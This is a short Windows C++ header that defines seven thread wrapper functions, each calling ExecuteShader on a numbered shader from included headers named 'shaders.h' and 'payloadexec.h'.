#pragma once
#include <windows.h>
#include "shaders.h"
#include "payloadexec.h"

DWORD WINAPI Shader1T() {
	ExecuteShader(Shader1, true);
	return 0;
}

DWORD WINAPI Shader2T() {
	ExecuteShader(Shader2, true);
	return 0;
}

DWORD WINAPI Shader3T() {
	ExecuteShader(Shader3, true);
	return 0;
}

DWORD WINAPI Shader4T() {
	ExecuteShader(Shader4, true);
	return 0;
}

DWORD WINAPI Shader5T() {
	ExecuteShader(Shader5, true);
	return 0;
}

DWORD WINAPI Shader6T() {
	ExecuteShader(Shader6, true);
	return 0;
}

DWORD WINAPI Shader7T() {
	ExecuteShader(Shader7, true);
	return 0;
}